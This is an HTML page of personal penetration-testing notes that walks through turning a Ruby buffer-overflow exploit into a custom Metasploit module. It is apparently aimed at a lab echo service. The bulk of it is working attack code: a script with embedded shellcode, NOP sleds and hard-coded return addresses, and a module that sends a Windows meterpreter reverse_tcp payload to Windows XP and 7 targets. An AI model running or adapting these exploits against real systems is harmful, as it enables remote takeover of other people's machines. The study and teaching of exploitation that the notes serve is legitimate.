<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Write a custom metasploit module</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Write a custom metasploit module</h1><br/><br />In the following example we will try to <span style="text-decoration:underline;">write a Metasploit module</span> from the Ruby script seen in <a href="Exploitation--Buffer_Overflow--Example_2_(outdated)_Buffer_Overflow_service_server--script_Ruby_Overwrite_the_EIP_&_Execute_the_Shellcode.html">script Ruby: Overwrite the EIP &amp; Execute the Shellcode</a> <br />If we do not follow the Metasploit Structure of the modules, msfconsole give us error <a href="Home--Penetration_Test_Methodology--Network_Pentest--Exploitation--Metasploit--Write_a_custom_metasploit_module--possible_errors.html">as we can see in this chapter</a>, because of that is better to follow a skeleton,<br />As the one below.<br /><br />Ruby script:<br /><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#bufferOverflowServer.rb</span><br /><br />preamble = <span style="color:#3ad900;font-weight:400">&quot;\x90&quot;</span> * 44<br />return_address = <span style="color:#3ad900;font-weight:400">&quot;\xE5\x5C\x36\x75&quot;</span><br />arguments_nop = <span style="color:#3ad900;font-weight:400">&quot;\x90&quot;</span> * 10 <br />buf = <br /><span style="color:#3ad900;font-weight:400">&quot;\xba\xd1\xaa\x60\xa3\xd9\xc4\xd9\x74\x24\xf4\x5d\x2b\xc9&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\xb1\x52\x31\x55\x12\x83\xc5\x04\x03\x84\xa4\x82\x56\xda&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\x51\xc0\x99\x22\xa2\xa5\x10\xc7\x93\xe5\x47\x8c\x84\xd5&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\x0c\xc0\x28\x9d\x41\xf0\xbb\xd3\x4d\xf7\x0c\x59\xa8\x36&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\x8c\xf2\x88\x59\x0e\x09\xdd\xb9\x2f\xc2\x10\xb8\x68\x3f&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\xd8\xe8\x21\x4b\x4f\x1c\x45\x01\x4c\x97\x15\x87\xd4\x44&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\xed\xa6\xf5\xdb\x65\xf1\xd5\xda\xaa\x89\x5f\xc4\xaf\xb4&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\x16\x7f\x1b\x42\xa9\xa9\x55\xab\x06\x94\x59\x5e\x56\xd1&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\x5e\x81\x2d\x2b\x9d\x3c\x36\xe8\xdf\x9a\xb3\xea\x78\x68&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\x63\xd6\x79\xbd\xf2\x9d\x76\x0a\x70\xf9\x9a\x8d\x55\x72&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\xa6\x06\x58\x54\x2e\x5c\x7f\x70\x6a\x06\x1e\x21\xd6\xe9&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\x1f\x31\xb9\x56\xba\x3a\x54\x82\xb7\x61\x31\x67\xfa\x99&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\xc1\xef\x8d\xea\xf3\xb0\x25\x64\xb8\x39\xe0\x73\xbf\x13&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\x54\xeb\x3e\x9c\xa5\x22\x85\xc8\xf5\x5c\x2c\x71\x9e\x9c&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\xd1\xa4\x31\xcc\x7d\x17\xf2\xbc\x3d\xc7\x9a\xd6\xb1\x38&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\xba\xd9\x1b\x51\x51\x20\xcc\x9e\x0e\x29\x84\x77\x4d\x2d&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\x85\xdb\xd8\xcb\xcf\xf3\x8c\x44\x78\x6d\x95\x1e\x19\x72&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\x03\x5b\x19\xf8\xa0\x9c\xd4\x09\xcc\x8e\x81\xf9\x9b\xec&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\x04\x05\x36\x98\xcb\x94\xdd\x58\x85\x84\x49\x0f\xc2\x7b&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\x80\xc5\xfe\x22\x3a\xfb\x02\xb2\x05\xbf\xd8\x07\x8b\x3e&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\xac\x3c\xaf\x50\x68\xbc\xeb\x04\x24\xeb\xa5\xf2\x82\x45&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\x04\xac\x5c\x39\xce\x38\x18\x71\xd1\x3e\x25\x5c\xa7\xde&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\x94\x09\xfe\xe1\x19\xde\xf6\x9a\x47\x7e\xf8\x71\xcc\x8e&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\xb3\xdb\x65\x07\x1a\x8e\x37\x4a\x9d\x65\x7b\x73\x1e\x8f&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\x04\x80\x3e\xfa\x01\xcc\xf8\x17\x78\x5d\x6d\x17\x2f\x5e&quot;</span> +<br /><span style="color:#3ad900;font-weight:400">&quot;\xa4&quot;</span><br /><br /><span style="color:#7f0044;font-weight:400">exploit</span>= preamble + return_address + arguments_nop + buf<br />host,port= ARGV[0], ARGV[1]<br />require <span style="color:#3ad900;font-weight:400">&#39;socket&#39;</span><br />TCPSocket.open<span style="color:#ff9d00;font-weight:700">(</span>host,port<span style="color:#ff9d00;font-weight:700">)</span> <span style="color:#ff9d00;font-weight:700">{|</span>s<span style="color:#ff9d00;font-weight:700">|</span> s.puts exploit<span style="color:#ff9d00;font-weight:700">}</span></pre></div><br /><br /><br />Metasploit Module:<br /><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">##</span><br /><span style="color:#0088ff;font-weight:400"># This module requires Metasploit: https://metasploit.com/download</span><br /><span style="color:#0088ff;font-weight:400"># Current source: https://github.com/rapid7/metasploit-framework</span><br /><span style="color:#0088ff;font-weight:400">##</span><br /><br /><br /><span style="color:#0088ff;font-weight:400">#use the msf core library</span><br />require <span style="color:#3ad900;font-weight:400">&#39;msf/core&#39;</span><br /><br /><span style="color:#0088ff;font-weight:400">#</span><br /><span style="color:#0088ff;font-weight:400"># Module Type</span><br /><span style="color:#0088ff;font-weight:400">#</span><br />class MetasploitModule &lt; Msf<span style="color:#ff9d00;font-weight:700">::</span>Exploit<span style="color:#ff9d00;font-weight:700">::</span>Remote    <span style="color:#0088ff;font-weight:400">#its going to be an exploit::remote module</span><br />        <span style="color:#0088ff;font-weight:400">#</span><br />        <span style="color:#0088ff;font-weight:400"># Module Requirements</span><br />        <span style="color:#0088ff;font-weight:400">#</span><br />        include Exploit<span style="color:#ff9d00;font-weight:700">::</span>Remote<span style="color:#ff9d00;font-weight:700">::</span>Tcp    <span style="color:#0088ff;font-weight:400"># we need it for </span><br />                                        <span style="color:#0088ff;font-weight:400">#   the connect method and the sock attribute</span><br />                                        <span style="color:#0088ff;font-weight:400">#   add the RHOST and RPORT options</span><br /><br />        <span style="color:#0088ff;font-weight:400">#</span><br />        <span style="color:#0088ff;font-weight:400"># Module Information</span><br />        <span style="color:#0088ff;font-weight:400">#</span><br />        <br />        <span style="color:#0088ff;font-weight:400">#Constructor of every class in Ruby</span><br />        <span style="color:#0088ff;font-weight:400">#   the parameters of the constructor vary according to the module type: exploit, auxiliary, payload</span><br />        def initialize<span style="color:#ff9d00;font-weight:700">(info</span> = <span style="color:#ff9d00;font-weight:700">{})</span>         <span style="color:#0088ff;font-weight:400">#mandatory</span><br />                super<span style="color:#ff9d00;font-weight:700">(</span>update_info<span style="color:#ff9d00;font-weight:700">(info</span>,   <span style="color:#0088ff;font-weight:400">#mandatory</span><br />                         <span style="color:#0088ff;font-weight:400">### It is a convention to start with Name, Description, Author ...</span><br />                        <span style="color:#3ad900;font-weight:400">&#39;Name&#39;</span>           =&gt; <span style="color:#3ad900;font-weight:400">&#39;Fox ECHO Server&#39;</span>,<br />                        <span style="color:#3ad900;font-weight:400">&#39;Description&#39;</span>    =&gt; %q<span style="color:#ff9d00;font-weight:700">{</span><br />                                This module exploits a buffer overflow found <span style="color:#ff9d00;font-weight:700">in</span> the Fox ECHO Server. <br />                        <span style="color:#ff9d00;font-weight:700">}</span>,<br />                        <span style="color:#3ad900;font-weight:400">&#39;Author&#39;</span>         =&gt; <span style="color:#3ad900;font-weight:400">&#39;Daniele&#39;</span>,<br />                        <span style="color:#3ad900;font-weight:400">&#39;License&#39;</span>        =&gt; MSF_LICENSE,<br />                        <span style="color:#0088ff;font-weight:400">### End of Description</span><br />                        <br />                        <span style="color:#0088ff;font-weight:400">#Default options of the module, important!</span><br />                        <span style="color:#3ad900;font-weight:400">&#39;DefaultOptions&#39;</span> =&gt; <br />                                <span style="color:#ff9d00;font-weight:700">{</span><br />                                        <span style="color:#0088ff;font-weight:400">#EXITFUNC option sets a function hash </span><br />                                        <span style="color:#0088ff;font-weight:400">#    in the payload that specifies a DLL and function to call when the payload is complete.</span><br />                                        <span style="color:#0088ff;font-weight:400">#    &quot;process&quot; usually is used with multi/handler</span><br />                                        <span style="color:#3ad900;font-weight:400">&#39;EXITFUNC&#39;</span> =&gt; <span style="color:#3ad900;font-weight:400">&#39;process&#39;</span>,<br />                                        <span style="color:#3ad900;font-weight:400">&#39;RPORT&#39;</span> =&gt; <span style="color:#3ad900;font-weight:400">&#39;7707&#39;</span><br />                                        <span style="color:#3ad900;font-weight:400">&#39;PAYLOAD&#39;</span> =&gt; <span style="color:#3ad900;font-weight:400">&#39;windows/meterpreter/reverse_tcp&#39;</span><br />                                        <span style="color:#3ad900;font-weight:400">&#39;TARGETS&#39;</span> =&gt; <span style="color:#3ad900;font-weight:400">&#39;Windows 7&#39;</span><br />                                <span style="color:#ff9d00;font-weight:700">}</span>,<br />                        <span style="color:#3ad900;font-weight:400">&#39;Payload&#39;</span>        =&gt;<br />                                <span style="color:#ff9d00;font-weight:700">{</span><br />                                        <span style="color:#0088ff;font-weight:400">#character to avoid</span><br />                                        <span style="color:#3ad900;font-weight:400">&#39;BadChars&#39;</span> =&gt; <span style="color:#3ad900;font-weight:400">&quot;\x00&quot;</span>,<br />                                <span style="color:#ff9d00;font-weight:700">}</span>,<br />                        <span style="color:#3ad900;font-weight:400">&#39;Platform&#39;</span> =&gt; <span style="color:#3ad900;font-weight:400">&#39;win&#39;</span>,<br />                        <span style="color:#0088ff;font-weight:400">#Note that Windows 7 sypport ASLR (Address space layout randomization) </span><br />                        <span style="color:#0088ff;font-weight:400">#  meaning that at every reboot of the machine we need to recalculate manually the address</span><br />                        <span style="color:#0088ff;font-weight:400">#  this mean this is only for testing purpose, </span><br />                        <span style="color:#0088ff;font-weight:400">#  to do that we should need access to the machine and the binary of the service</span><br />                        <span style="color:#3ad900;font-weight:400">&#39;Targets&#39;</span>        =&gt;<br />                                [<br />                                        [<span style="color:#3ad900;font-weight:400">&#39;Windows XP SP3&#39;</span>,<span style="color:#ff9d00;font-weight:700">{</span> <span style="color:#3ad900;font-weight:400">&#39;Ret&#39;</span>=&gt; 0x7c868667 <span style="color:#ff9d00;font-weight:700">}</span> ], <span style="color:#0088ff;font-weight:400"># Target 0</span><br />                                        [<span style="color:#3ad900;font-weight:400">&#39;Windows 7&#39;</span>,<span style="color:#ff9d00;font-weight:700">{</span> <span style="color:#3ad900;font-weight:400">&#39;Ret&#39;</span>=&gt; 0x762CF7DF <span style="color:#ff9d00;font-weight:700">}</span> ]	<span style="color:#0088ff;font-weight:400"># Target 1</span><br />                                ],<br />                        <span style="color:#0088ff;font-weight:400">#target value 0 means in our case is &quot;Windows XP SP3&quot;</span><br />                        <span style="color:#3ad900;font-weight:400">&#39;DefaultTarget&#39;</span>=&gt; 0<br />                <span style="color:#ff9d00;font-weight:700">)</span>       <span style="color:#0088ff;font-weight:400">#End of update_info</span><br />                <span style="color:#ff9d00;font-weight:700">)</span>       <span style="color:#0088ff;font-weight:400">#End of super</span><br />        end<br />        <br />        <span style="color:#0088ff;font-weight:400">#</span><br />        <span style="color:#0088ff;font-weight:400"># Module Operations</span><br />        <span style="color:#0088ff;font-weight:400">#</span><br />        <span style="color:#0088ff;font-weight:400">#check, metasploit command, is used to verify if the target is exploitable, it is not a mandatory command</span><br />        <span style="color:#0088ff;font-weight:400"># check method override the check method of Msf::Exploit::Remote class.</span><br />        def check<br />                <span style="color:#0088ff;font-weight:400">#connect is a method provided by Remote::Tcp.</span><br />                <span style="color:#0088ff;font-weight:400"># It create TCP connection with the remote target, </span><br />                <span style="color:#0088ff;font-weight:400">#  the target information will be retrieved from RHOST and RPORT parameters</span><br />                <span style="color:#0088ff;font-weight:400">#same thing in Ruby of s=TCPSocket.new IP,PORT</span><br />                connect<br />                <span style="color:#0088ff;font-weight:400">#Exploit::Remote::Tcp tells us that the attribute to interact with the TCP connection is sock</span><br />                <span style="color:#0088ff;font-weight:400"># same thing in Ruby of banner=s.gets</span><br />                banner = sock.<span style="color:#ffdd00;font-weight:400">gets()</span><br />                disconnect<br />                <span style="color:#0088ff;font-weight:400">#Very easy check... check only the banner :)</span><br />                <span style="color:#ff9d00;font-weight:700">if</span> <span style="color:#ff9d00;font-weight:700">(</span>banner =~ <span style="color:#ff9d00;font-weight:700">/</span>Fox Echo Server x.x<span style="color:#ff9d00;font-weight:700">/)</span> <span style="color:#0088ff;font-weight:400"># We test the banner returned by the server</span><br />                        <span style="color:#ff9d00;font-weight:700">return</span> Exploit<span style="color:#ff9d00;font-weight:700">::</span>CheckCode<span style="color:#ff9d00;font-weight:700">::</span>Vulnerable <span style="color:#0088ff;font-weight:400"># The server is vulnerable, standard Metasploit return value</span><br />                end<br />                        <span style="color:#ff9d00;font-weight:700">return</span> Exploit<span style="color:#ff9d00;font-weight:700">::</span>CheckCode<span style="color:#ff9d00;font-weight:700">::</span>Safe <span style="color:#0088ff;font-weight:400"># The server is NOT vulnerable, standard Metasploit return value</span><br />        end<br /><br />        def exploit <span style="color:#0088ff;font-weight:400"># exploitation script </span><br />                <span style="color:#0088ff;font-weight:400">#connect is a method provided by Remote::Tcp.</span><br />                <span style="color:#0088ff;font-weight:400"># It create TCP connection with the remote target, </span><br />                <span style="color:#0088ff;font-weight:400">#  the target information will be retrieved from RHOST and RPORT parameters</span><br />                connect<br />                print_status<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;Connected to #{datastore[&#39;RHOST&#39;]}:#{datastore[&#39;RPORT&#39;]}&quot;</span><span style="color:#ff9d00;font-weight:700">)</span><br />                <span style="color:#0088ff;font-weight:400"># handler open a listening socket to the LHOST and LPORT. </span><br />                <span style="color:#0088ff;font-weight:400">#  In order to receive a connection from the windows/meterpreter/reverse_tcp Payload set by default</span><br />                handler<br />                print_status<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;Trying target #{target.name}&quot;</span><span style="color:#ff9d00;font-weight:700">)</span><br />                <span style="color:#0088ff;font-weight:400">#Payload to send</span><br />                <span style="color:#0088ff;font-weight:400"># target.ret--&gt; target-return address, automatically assigned with the initialize constructor (https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/module/target.rb#L135)</span><br />                <span style="color:#0088ff;font-weight:400"># payload.encoded --&gt; result of payload options set before(badchar), and it&#39;s encoded with an encoder that is platform-dependent.</span><br />                buff = <span style="color:#3ad900;font-weight:400">&quot;\x90&quot;</span>*44 + [target.ret].pack<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&#39;V&#39;</span><span style="color:#ff9d00;font-weight:700">)</span> + <span style="color:#3ad900;font-weight:400">&quot;\x90&quot;</span>*10 + payload.encoded<br />                <span style="color:#0088ff;font-weight:400">#ALTERNATIVE more sophisticated to recognize as an attack</span><br />                <span style="color:#0088ff;font-weight:400">#    buff = make_nops(44) + [target.ret].pack(&#39;V&#39;) + make_nops(10) + payload.encoded</span><br />                <span style="color:#0088ff;font-weight:400">#send the entire payload (buff) to the server using the available socket</span><br />                sock.put<span style="color:#ff9d00;font-weight:700">(</span>buff<span style="color:#ff9d00;font-weight:700">)</span><br />                disconnect<br />        end<br />end</pre></div><br /><br />Similar Metasploit Buffer Overflow modules:<br /><a href="https://github.com/rapid7/metasploit-framework/blob/04e8752b9b74cbaad7cb0ea6129c90e3172580a2/modules/exploits/linux/misc/hp_vsa_login_bof.rb">https://github.com/rapid7/metasploit-framework/blob/04e8752b9b74cbaad7cb0ea6129c90e3172580a2/modules/exploits/linux/misc/hp_vsa_login_bof.rb</a><br /><a href="https://github.com/rapid7/metasploit-framework/blob/04e8752b9b74cbaad7cb0ea6129c90e3172580a2/modules/exploits/windows/scada/yokogawa_bkesimmgr_bof.rb">https://github.com/rapid7/metasploit-framework/blob/04e8752b9b74cbaad7cb0ea6129c90e3172580a2/modules/exploits/windows/scada/yokogawa_bkesimmgr_bof.rb</a><br /><a href="https://github.com/rapid7/metasploit-framework/blob/04e8752b9b74cbaad7cb0ea6129c90e3172580a2/modules/exploits/multi/misc/persistent_hpca_radexec_exec.rb">https://github.com/rapid7/metasploit-framework/blob/04e8752b9b74cbaad7cb0ea6129c90e3172580a2/modules/exploits/multi/misc/persistent_hpca_radexec_exec.rb</a><br /><br /><br /><strong><h2>Parameters</h2></strong><br />• <strong>target.ret</strong> → target-return address, automatically assigned with the initialize constructor (https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/module/target.rb#L135)<br />• <strong>payload.encoded</strong> → check this post <a href="https://stackoverflow.com/questions/21814702/where-does-the-payload-in-the-payload-encoded-come-from-in-a-metasploits-ex">https://stackoverflow.com/questions/21814702/where-does-the-payload-in-the-payload-encoded-come-from-in-a-metasploits-ex</a><br />    payload.encoded result of payload options set before(badchar), and it&#39;s encoded with an encoder that is platform-dependent.<br />   ◇ payload defined here: <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload.rb#L205">https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload.rb#L205</a><br />        payload initialized with values in the payload of the initialize constructor in our payload<br />        <div class="codebox"><pre>def payload<br />    <span style="color:#ff9d00;font-weight:700">return</span> module_info[<span style="color:#3ad900;font-weight:400">&#39;Payload&#39;</span>] ? module_info[<span style="color:#3ad900;font-weight:400">&#39;Payload&#39;</span>][<span style="color:#3ad900;font-weight:400">&#39;Payload&#39;</span>] <span style="color:#ff9d00;font-weight:700">:</span> nil<br />end</pre></div><br />   ◇ encoded payload generated here: <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/base/simple/payload.rb#L47">https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/base/simple/payload.rb#L47</a><br />        <div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># Import any options we may need</span><br />payload._import_extra_options<span style="color:#ff9d00;font-weight:700">(</span>opts<span style="color:#ff9d00;font-weight:700">)</span><br />framework = payload.framework<br /><br /><span style="color:#0088ff;font-weight:400"># Generate the payload</span><br />e = EncodedPayload.create<span style="color:#ff9d00;font-weight:700">(</span>payload,<br />    <span style="color:#3ad900;font-weight:400">&#39;BadChars&#39;</span>    =&gt; opts[<span style="color:#3ad900;font-weight:400">&#39;BadChars&#39;</span>],<br />    <span style="color:#3ad900;font-weight:400">&#39;MinNops&#39;</span>     =&gt; opts[<span style="color:#3ad900;font-weight:400">&#39;NopSledSize&#39;</span>],<br />    <span style="color:#3ad900;font-weight:400">&#39;PadNops&#39;</span>     =&gt; opts[<span style="color:#3ad900;font-weight:400">&#39;PadNops&#39;</span>],<br />    <span style="color:#3ad900;font-weight:400">&#39;Encoder&#39;</span>     =&gt; opts[<span style="color:#3ad900;font-weight:400">&#39;Encoder&#39;</span>],<br />    <span style="color:#3ad900;font-weight:400">&#39;Iterations&#39;</span>  =&gt; opts[<span style="color:#3ad900;font-weight:400">&#39;Iterations&#39;</span>],<br />    <span style="color:#3ad900;font-weight:400">&#39;ForceEncode&#39;</span> =&gt; opts[<span style="color:#3ad900;font-weight:400">&#39;ForceEncode&#39;</span>],<br />    <span style="color:#3ad900;font-weight:400">&#39;DisableNops&#39;</span> =&gt; opts[<span style="color:#3ad900;font-weight:400">&#39;DisableNops&#39;</span>],<br />    <span style="color:#3ad900;font-weight:400">&#39;Space&#39;</span>       =&gt; opts[<span style="color:#3ad900;font-weight:400">&#39;MaxSize&#39;</span>]<span style="color:#ff9d00;font-weight:700">)</span><br />    <br />    </pre></div><br />   ◇ <span style="text-decoration:underline;">encodedPayload</span> defined here: <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/encoded_payload.rb">https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/encoded_payload.rb</a><br />       encodedPayload.create is defined here<br />       <div class="codebox"><pre>def self.create<span style="color:#ff9d00;font-weight:700">(</span>pinst, reqs = <span style="color:#ff9d00;font-weight:700">{})</span><br />    <span style="color:#0088ff;font-weight:400"># Create the encoded payload instance</span><br />    p = EncodedPayload.new<span style="color:#ff9d00;font-weight:700">(</span>pinst.framework, pinst, reqs<span style="color:#ff9d00;font-weight:700">)</span><br />    p.generate<span style="color:#ff9d00;font-weight:700">(</span>reqs[<span style="color:#3ad900;font-weight:400">&#39;Raw&#39;</span>]<span style="color:#ff9d00;font-weight:700">)</span>                             <span style="color:#0088ff;font-weight:400">#sets the encoded method</span><br />    <span style="color:#ff9d00;font-weight:700">return</span> p<br />end</pre></div><br />       generate method is the one that set the method encoded method</div>
</body>
</html>
